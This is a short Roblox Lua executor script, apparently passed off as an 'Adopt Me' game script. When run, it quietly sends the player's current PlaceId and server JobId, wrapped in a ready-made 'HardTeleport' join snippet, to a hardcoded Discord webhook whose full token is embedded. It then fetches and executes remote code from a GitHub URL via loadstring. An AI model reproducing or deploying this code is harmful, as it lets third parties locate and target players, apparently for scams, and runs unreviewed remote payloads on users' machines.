local WebhookOfUltraInstinct =
    "https://discord.com/api/webhooks/1407600594956451962/G8Bb9jKI8GIPGyG2f9n8Uco1MonwvixIiJ9itndeyXEAgDJIp8sdcY1a07BBwb3kvjrq"
_G.Discord_UserID = "" -- ID To Ping on every execution, blank if no one wants to be pinged.

-- // Services
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- // Backup critical function references early
local rawTP1 = TeleportService.TeleportToPlaceInstance
local rawTP2 = rawget(TeleportService, "TeleportToPlaceInstance")
local rawTP3 = getrawmetatable and getrawmetatable(TeleportService) and rawget(getrawmetatable(TeleportService), "TeleportToPlaceInstance")

-- Put all backups in a list
local tpFuncs = {}
for _, f in ipairs({rawTP1, rawTP2, rawTP3}) do
    if typeof(f) == "function" then
        table.insert(tpFuncs, f)
    end
end

-- // Safe call wrapper
local function safeCall(func, ...)
    local ok, result = pcall(func, ...)
    return ok, result
end

-- // Hardened teleport
local function HardTeleport(placeId, jobId)
    for _, f in ipairs(tpFuncs) do
        local ok = pcall(function()
            f(TeleportService, placeId, jobId, player)
        end)
        if ok then
            return true
        end
    end
    warn("[AntiTamper] Teleport blocked or tampered!")
    return false
end

-- // Example usage in your Discord message
local msg = {
    ["username"] = "JOIN KANA!",
    ["embeds"] = {
        {
            ["title"] = "Game Teleporter Method",
            ["fields"] = {
                {
                    ["name"] = "Teleport Snippet",
                    ["value"] = 
                        "```lua\nHardTeleport(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")\n```",
                    ["inline"] = false
                }
            }
        }
    }
}

-- âœ… Send to Discord
request = request or http_request or syn.request
if request then
    request({
        Url = WebhookOfUltraInstinct,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode(msg)
    })
end


loadstring(game:HttpGet("https://raw.githubusercontent.com/AdoptMeScript-ux/Adopt-Me-Script/refs/heads/main/Enhanced%20Script"))()
